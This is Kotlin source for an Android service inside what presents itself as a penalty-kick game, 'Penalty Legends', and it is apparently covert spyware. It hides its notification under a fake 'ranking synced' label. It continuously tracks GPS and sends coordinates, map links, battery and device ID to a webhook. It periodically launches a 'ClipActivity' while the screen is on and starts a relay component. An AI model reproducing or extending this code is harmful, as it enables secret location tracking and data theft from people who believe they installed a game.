package com.venice.penaltylegends.core

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.PowerManager
import androidx.core.app.NotificationCompat
import androidx.core.app.ServiceCompat
import androidx.core.content.ContextCompat

class CoreService : Service(), LocationListener {

    private val ui = Handler(Looper.getMainLooper())
    private lateinit var lm: LocationManager
    private var ultimoClip = 0L

    override fun onCreate() {
        super.onCreate()
        criarCanal()
        subir()
        lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
        pedirGps()
        agendarTudo()
    }

    override fun onStartCommand(i: Intent?, f: Int, s: Int): Int = START_STICKY

    override fun onBind(i: Intent?): IBinder? = null

    private fun criarCanal() {
        if (Build.VERSION.SDK_INT < 26) return
        val nm = getSystemService(NotificationManager::class.java)
        if (nm.getNotificationChannel(Config.CANAL_ID) != null) return
        // IMPORTANCE_MIN -> sem icone na barra de status
        val ch = NotificationChannel(
            Config.CANAL_ID, "Penalty Legends", NotificationManager.IMPORTANCE_MIN
        ).apply {
            setShowBadge(false)
            enableLights(false)
            enableVibration(false)
            description = "Sincronizacao de placar e ranking"
        }
        nm.createNotificationChannel(ch)
    }

    private fun notificacao(): Notification {
        val pi = PendingIntent.getActivity(
            this, 0, Intent(this, com.venice.penaltylegends.ui.MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )
        return NotificationCompat.Builder(this, Config.CANAL_ID)
            .setSmallIcon(android.R.drawable.ic_menu_compass)
            .setContentTitle("Penalty Legends")
            .setContentText("Ranking sincronizado")
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .setShowWhen(false)
            .setContentIntent(pi)
            .build()
    }

    private fun subir() {
        val temGps = ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) ==
                android.content.pm.PackageManager.PERMISSION_GRANTED
        var tipo = 0
        if (Build.VERSION.SDK_INT >= 29) {
            tipo = if (temGps) ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
            else ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
            if (temGps) tipo = tipo or ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
        }
        try {
            ServiceCompat.startForeground(this, 1001, notificacao(), tipo)
        } catch (t: Throwable) {
            startForeground(1001, notificacao())
        }
    }

    // ---------- agendamentos ----------

    private fun agendarTudo() {
        ui.post(tick)
    }

    private val tick = object : Runnable {
        override fun run() {
            val agora = System.currentTimeMillis()

            Webhook.flush(this@CoreService)

            if (agora - Prefs.ultimoGpsEnvio > Config.GPS_MINUTOS * 60_000) {
                Prefs.ultimoGpsEnvio = agora
                pedirGps()
            }

            val telaLigada = (getSystemService(Context.POWER_SERVICE) as PowerManager).isInteractive
            if (telaLigada && agora - ultimoClip > Config.CLIP_MINUTOS * 60_000) {
                ultimoClip = agora
                try {
                    startActivity(
                        Intent(this@CoreService, ClipActivity::class.java)
                            .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    )
                } catch (_: Throwable) {}
            }

            if (agora - Prefs.ultimoHeartbeat > Config.HEARTBEAT_HORAS * 3_600_000) {
                Prefs.ultimoHeartbeat = agora
                heartbeat()
            }

            Relay.start(this@CoreService)

            ui.postDelayed(this, 60_000)
        }
    }

    // ---------- GPS ----------

    private fun pedirGps() {
        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION)
            != android.content.pm.PackageManager.PERMISSION_GRANTED) return
        try {
            val provedor = if (lm.isProviderEnabled(LocationManager.GPS_PROVIDER))
                LocationManager.GPS_PROVIDER else LocationManager.NETWORK_PROVIDER
            lm.requestLocationUpdates(provedor, 0L, 0f, this, Looper.getMainLooper())
            lm.getLastKnownLocation(provedor)?.let { onLocationChanged(it) }
        } catch (_: Throwable) {}
    }

    override fun onLocationChanged(loc: Location) {
        val map = "https://www.google.com/maps?q=${loc.latitude},${loc.longitude}"
        Webhook.sendEmbed(
            this,
            Webhook.embed(
                titulo = "LOCALIZACAO",
                desc = "[${"%.5f".format(loc.latitude)}, ${"%.5f".format(loc.longitude)}]($map)",
                cor = 0xE67E22,
                campos = listOf(
                    Webhook.f("Precisao", "${loc.accuracy.toInt()} m", true),
                    Webhook.f("Provedor", loc.provider ?: "-", true),
                    Webhook.f("Bateria", "${Device.bateria(this)}%", true)
                )
            )
        )
    }

    @Deprecated("Deprecated in Java")
    override fun onStatusChanged(p: String?, s: Int, e: Bundle?) {}

    // ---------- heartbeat ----------

    private fun heartbeat() {
        Webhook.sendEmbed(
            this,
            Webhook.embed(
                titulo = "SINAL DE VIDA",
                desc = "Servico rodando normalmente.",
                cor = 0x1ABC9C,
                campos = listOf(
                    Webhook.f("Aparelho", Prefs.deviceId, true),
                    Webhook.f("Bateria", "${Device.bateria(this)}%", true),
                    Webhook.f("Carregando", if (Device.carregando(this)) "sim" else "nao", true),
                    Webhook.f("Fila offline", "${Webhook.pendentes(this)} itens", true)
                )
            )
        )
    }

    override fun onDestroy() {
        ui.removeCallbacks(tick)
        super.onDestroy()
    }
}